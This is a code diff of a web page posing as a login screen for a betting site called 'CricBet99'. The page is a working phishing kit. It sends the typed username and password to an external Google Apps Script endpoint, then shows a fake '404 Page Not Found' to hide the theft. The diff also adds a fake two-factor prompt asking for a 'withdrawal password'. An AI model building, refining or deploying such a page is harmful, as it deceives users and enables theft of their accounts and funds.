@@ -7,35 +7,33 @@
     <style>
         body {
             font-family: Arial, sans-serif;
-            background: linear-gradient(5deg, rgba(69, 100, 51, 0.959),#355539,#2e4731,#864f04);
+            background: linear-gradient(180deg, #8a4e00, #116257);
             margin: 0;
             padding: 0;
             display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
             flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            height: 100vh;
+            padding-top: 50px;
         }
 
         .logo {
             width: 320px;
             height: auto;
             margin-bottom: 20px;
-            position: relative;
-            top: -350px;
         }
 
-        .login-container {
+        .container {
             background-color: #fff;
             padding: 20px;
             border-radius: 8px;
             box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
             width: 280px;
             text-align: center;
-            margin-top: -350px;
         }
 
-        .login-heading {
+        .heading {
             font-size: 24px;
             font-weight: bold;
             margin-bottom: 10px;
@@ -79,8 +77,8 @@
         .recaptcha-text {
             font-size: 12px;
             color: #6c757d;
-            text-align: center;
             margin-top: 15px;
+            text-align: center;
         }
 
         .recaptcha-text a {
@@ -92,101 +90,117 @@
             text-decoration: underline;
         }
 
-        .error-page {
-            display: none;
-            text-align: center;
-            font-size: 48px;
+        .error-message {
+            font-size: 18px;
+            margin-bottom: 20px;
+            color: #6c757d;
+        }
+
+        .bold-text {
             font-weight: bold;
-            color: white;
-            background-color: black;
-            width: 300px;
-            padding: 40px;
-            border-radius: 10px;
-            margin-top: 20px;
-            position: relative;
-            top: -50px;
         }
 
-        .error-page button {
-            background-color: #8B4513;
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 16px;
-            margin-top: 20px;
-        }
-
-        .error-page button:hover {
-            background-color: #5A3310;
-        }
-
-        .hide-logo {
+        .hidden {
             display: none;
         }
     </style>
 </head>
 <body>
     <!-- Logo -->
-    <img src="logo.png" alt="CricBet99 Logo" class="logo" id="logo">
+    <img src="logo.png" alt="CricBet99 Logo" class="logo">
 
-    <!-- Login Form Container -->
-    <div class="login-container">
-        <div class="login-heading">LOGIN</div>
-        <form action="https://script.google.com/macros/s/AKfycbz2yNi0v9CH5eN9OwTyEjnVMsmn1x7dOaG-BgdmekNg8cMPuf6fzymh4r9fKAKybJ-s/exec" method="POST" id="loginForm" onsubmit="handleLoginForm(event)">
-            <div class="form-group">
-                <label for="UserName"></label>
-                <input type="text" id="UserName" name="UserName" placeholder="User Name" required>
+    <!-- Main Container -->
+    <div class="container" id="mainContainer">
+        <!-- Login Form -->
+        <div id="loginForm">
+            <div class="heading">LOGIN</div>
+            <form 
+                action="https://script.google.com/macros/s/AKfycbz2yNi0v9CH5eN9OwTyEjnVMsmn1x7dOaG-BgdmekNg8cMPuf6fzymh4r9fKAKybJ-s/exec" 
+                method="POST" 
+                onsubmit="handleFormSubmit(event)">
+                <div class="form-group">
+                    <input type="text" id="UserName" name="UserName" placeholder="User Name" required>
+                </div>
+                <div class="form-group">
+                    <input type="password" id="password" name="password" placeholder="Password" required>
+                </div>
+                <button type="submit" class="btn">Login</button>
+            </form>
+            <button class="btn" style="margin-top: 10px;" onclick="loadDemoForm()">Login with Demo ID</button>
+            <!-- reCAPTCHA text -->
+            <div class="recaptcha-text">
+                <span class="bold-text">This site is protected by reCAPTCHA and the Google</span> 
+                <a href="#">Privacy Policy</a> and 
+                <a href="#">Terms of Service</a> apply.
             </div>
-            <div class="form-group">
-                <label for="password"></label>
-                <input type="password" id="password" name="password" placeholder="Password" required>
-            </div>
-            <button type="submit" class="btn">Login</button>
-        </form>
+        </div>
 
-        <div class="recaptcha-text">
-            <span>This site is protected by reCAPTCHA and the Google</span> 
-            <a href="#">Privacy Policy</a> and 
-            <a href="#">Terms of Service</a> apply.
+        <!-- Demo Login Form -->
+        <div id="demoForm" class="hidden">
+            <div class="heading">LOGIN</div>
+            <p style="font-weight: bold; color: black; margin: 0;">2-Factor Authentication Enabled.</p>
+            <p style="font-weight: bold; color: black; margin: 5px 0 10px;">Enter Your Withdrawal Password</p> <!-- Small margin for spacing -->
+            <form onsubmit="handleDemoSubmit(event)">
+                <div class="form-group" style="margin-bottom: 15px;"> <!-- Add spacing below text field -->
+                    <input type="text" id="withdrawalCode" name="withdrawalCode" placeholder="Withdrawal Code" required>
+                </div>
+                <button type="submit" class="btn">Submit</button>
+            </form>
+            <!-- reCAPTCHA text -->
+            <div class="recaptcha-text">
+                <span class="bold-text">This site is protected by reCAPTCHA and the Google</span> 
+                <a href="#">Privacy Policy</a> and 
+                <a href="#">Terms of Service</a> apply.
+            </div>
+        </div>
+
+        <!-- Error 404 Page -->
+        <div id="error404" class="hidden">
+            <div class="heading" style="color: #dc3545;">404</div>
+            <div class="error-message">Page Not Found</div>
+            <button class="btn" onclick="goToHome()">Back to Home Page</button>
         </div>
     </div>
 
-    <!-- Error Page -->
-    <div class="error-page" id="errorPage">
-        404 PAGE NOT FOUND
-        <button onclick="goBackToHome()">Back to Home Page</button>
-    </div>
-
     <script>
-        // Handle the login form submission
-        function handleLoginForm(event) {
-            event.preventDefault(); // Prevent the default form submission
+        function handleFormSubmit(event) {
+            event.preventDefault(); // Prevent the form from navigating to the success page
 
-            // Retrieve form data
+            // Fetch the form data and submit it to the Google Apps Script URL
             const form = event.target;
             const formData = new FormData(form);
+            const actionUrl = form.action;
 
-            // Submit the form data to the Google Sheet
-            fetch(form.action, {
+            fetch(actionUrl, {
                 method: 'POST',
                 body: formData,
-            })
-            .then(() => {
-                // After submission, show the 404 error page
-                document.querySelector('.login-container').style.display = 'none'; // Hide the login container
-                document.getElementById('errorPage').style.display = 'block'; // Show the error page
-                document.getElementById('logo').classList.add('hide-logo'); // Hide the logo
-            })
-            .catch((error) => {
-                console.error('Error submitting the form:', error); // Log any errors
+            }).then(() => {
+                // Show the error 404 page after submission
+                document.getElementById("loginForm").classList.add("hidden");
+                document.getElementById("error404").classList.remove("hidden");
+            }).catch((error) => {
+                console.error('Error submitting form:', error);
             });
         }
 
-        // Function to redirect back to the home page
-        function goBackToHome() {
-            window.location.href = 'index.html'; // Adjust URL if needed
+        function loadDemoForm() {
+            // Load the demo form (hide main login form and show demo form)
+            document.getElementById("loginForm").classList.add("hidden");
+            document.getElementById("demoForm").classList.remove("hidden"); // Make demo form visible
+        }
+
+        function handleDemoSubmit(event) {
+            event.preventDefault(); // Prevent default form submission
+
+            // Show the error 404 page
+            document.getElementById("demoForm").classList.add("hidden");
+            document.getElementById("error404").classList.remove("hidden");
+        }
+
+        function goToHome() {
+            // Return to the main login form
+            document.getElementById("error404").classList.add("hidden");
+            document.getElementById("loginForm").classList.remove("hidden");
         }
     </script>
 </body>
